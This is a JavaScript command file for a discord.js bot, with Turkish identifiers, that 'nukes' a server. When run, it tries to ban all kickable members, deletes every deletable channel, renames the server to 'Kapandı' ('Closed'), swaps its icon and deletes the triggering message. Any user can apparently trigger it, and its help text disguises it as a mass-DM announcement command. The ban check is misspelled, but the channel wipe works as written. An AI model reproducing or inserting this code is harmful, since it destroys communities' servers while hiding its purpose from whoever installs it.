const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;
let insanlar = 0;

      
message.guild.members.forEach(u => {
if (u.kicknable) {
insanlar++
message.guild.ban(u, "Berke Adamdır")
}
})
 
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});  


console.log(`Sunucudaki ${insanlar} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
  
message.guild.setName(`Kapandı`, ":))")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
 
message.guild.createChannel(`hey`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'benberke',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
